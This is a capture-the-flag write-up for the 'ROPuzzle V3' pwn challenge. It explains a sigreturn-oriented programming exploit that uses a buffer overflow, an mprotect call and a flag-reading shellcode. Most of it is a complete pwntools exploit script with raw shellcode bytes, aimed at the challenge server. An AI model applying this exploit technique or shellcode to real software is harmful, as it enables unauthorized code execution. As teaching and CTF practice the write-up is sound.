# ROPuzzle V3
![](https://img.shields.io/badge/category-pwn-blue)
![](https://img.shields.io/badge/points-400-orange)

## Description
```
placeholder - problem hidden
```

## Solution
The binary is very small. We have a buffer overflow, but no gadgets and no libc to jump to.

Actually, we do have a `syscall` gadget available. This can let us do a `sigreturn` syscall, giving us complete code execution - as long as we can set `rax` to 15, the syscall number for sigreturn. However, this doesn't seem possible, since there are no rax gadgets. Luckily, it is, because rax is not cleared after syscalls. And the read syscall returns the number of bytes read, in rax. So if we only get the program to read in 15 bytes, then rax will be set up properly.

However, 15 bytes is too little to do anything with. We can overcome this by reading in our full input, returning back to the start of the get_input function, reading 15 bytes, returning to the syscall gadget, giving us a sigreturn. Success!!

This is wonderful and all, but we still need to be able to either get a shell or print the flag after the sigreturn. Trying to get a shell won't work in Alpine linux (the distro used in the challenge), so our only option is to print the flag, which will require us to enter shellcode, which means we need a segment in the program that allows read, write, and execute.

Then, our exploit is:
1. Write return address to start of get_input, write initial sigreturn frame, setting up registers for a `mprotect(0x400000, 0x1000, 7)` call (0x400000 is a safe location), and also moving the stack to somewhere in the 0x400000 range.
2. Write 15 bytes
3. Program returns to syscall and does the sigreturn
4. Sigreturn returns to syscall and performs the mprotect
5. Return to somewhere in the program that will allow us to enter input again
6. Read input into our new stack at 0x400000 and return to our shellcode in there


```py
from pwn import *

context.arch = 'amd64'

if args.LOCAL:
    p = process("./main")
else:
    p = remote("ctf.joshl.ca", 5000)

# Important addresses
input_addr = 0x000000000040100a
syscall = 0x401020

# Payload 1: 8 bytes garbage + return address + garbage + sigreturn frame
pay = b'A'*8 + p64(input_addr) + p64(0)
frame = SigreturnFrame() # mprotect(0x400000, 0x1000, 7)
frame.rax = 10
frame.rdi = 0x400000
frame.rsi = 0x1000
frame.rdx = 7
frame.rsp = 0x400010        # our new stack exists here, because this address
                            # contains the address of main, which we'll need to
                            # return to
frame.rip = syscall

pay += bytes(frame)

p.send(pay)
with open('in', 'wb') as f:
    f.write(pay)

pause()

# At this point, the payload 1 is read, the program jumped back to the start of read_input, and our full payload is on the stack

# Payload 2: 15 bytes, make sure we overwrite the return pointer back to syscall
pay = b'A'*8 + p64(syscall)
pay = pay[:15]

with open('in', 'ab') as f:
    f.write(pay)
p.send(pay)
pause()

# At this point, rax = 15, we return to the syscall, which performs the sigreturn syscall, returning back to the
# sigreturn syscall (controlled by frame.rip), making the mprotect syscall, then returning into the address pointed
# to by frame.rsp (start of main), which calls read_input again - but now the stack is at our special location.

# Payload 3:
# 0x400010: "flag.txt"
# 0x400018: overwriting the return address to go to 0x400020
# 0x400020: our shellcode
# The first and second instructions are important because we need to make sure the first byte after "flag.txt"
# is a null byte, but it contains 0x400020 right now. To fix this, we can just move 0 to 0x400018.
"""
   0:   31 c0                   xor    eax, eax
   2:   89 04 25 18 00 40 00    mov    dword[0x400018], eax
   9:   b8 02 00 00 00          mov    eax, 0x2
   e:   bf 10 00 40 00          mov    edi, 0x400010
  13:   31 f6                   xor    esi, esi
  15:   31 d2                   xor    edx, edx
  17:   0f 05                   syscall                 ; int fd = open("flag.txt", "r", "r")
  19:   89 c7                   mov    edi, eax
  1b:   31 c0                   xor    eax, eax
  1d:   be 00 05 40 00          mov    esi, 0x400500    ; known safe address
  22:   ba 64 00 00 00          mov    edx, 0x64
  27:   0f 05                   syscall                 ; read(fd, 0x400500, 0x64)
  29:   b8 01 00 00 00          mov    eax, 0x1
  2e:   bf 01 00 00 00          mov    edi, 0x1
  33:   be 00 05 40 00          mov    esi, 0x400500
  38:   ba 64 00 00 00          mov    edx, 0x64
  3d:   0f 05                   syscall                 ; write(stdout, 0x400500, 0x64)
"""
pay = b'flag.txt' + p64(0x400020) + b'\x31\xc0\x89\x04\x25\x18\x00\x40\x00\xb8\x02\x00\x00\x00\xbf\x10\x00\x40\x00\x31\xf6\x31\xd2\x0f\x05\x89\xc7\x31\xc0\xbe\x00\x05\x40\x00\xba\x64\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\xbe\x00\x05\x40\x00\xba\x64\x00\x00\x00\x0f\x05'

with open('in', 'ab') as f:
    f.write(pay)
p.send(pay)
pause()
p.interactive()
```

Flag: `CTF{Best_use_of_srop_i_have_seen_so_far!}`
